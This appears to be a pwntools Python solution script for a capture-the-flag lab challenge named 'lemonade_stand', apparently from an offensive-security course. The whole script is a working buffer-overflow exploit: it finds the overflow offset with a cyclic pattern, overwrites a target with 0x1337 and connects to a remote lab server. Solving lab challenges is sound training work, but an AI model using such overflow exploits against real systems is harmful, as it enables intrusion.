from pwn import *

ADDR = "offsec.m0lecon.it"
port = 13596

elf = ELF('/home/kali/Desktop/offsec/labs/lab1/materiale/challenges/03-lemonade-stand/lemonade_stand')

context.binary = elf
context.arch = "amd64"
context.os = "linux"

def conn():
    if args.LOCAL:
        r = process(elf.path)
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote(ADDR, port)

    return r

def get_target_offset():
    # Start a dummy process to crash
    p_crash = process(elf.path)
    
    p_crash.recvuntil(b"price:")
    p_crash.sendline(cyclic(200))
    val = int(p_crash.recvuntil(b".").split(b"now it's: ")[1].split(b".")[0].decode(), 16)

    offset = cyclic_find(val)
    print(f"Calculated offset to RIP: {offset}")
    return offset

OFFSET_TO_TARGET = get_target_offset()

r = conn()

target = 0x1337

payload = flat(
    b"A" * OFFSET_TO_TARGET,
    p64(target)
)

r.recvuntil(b"price:")
r.sendline(payload)
r.interactive()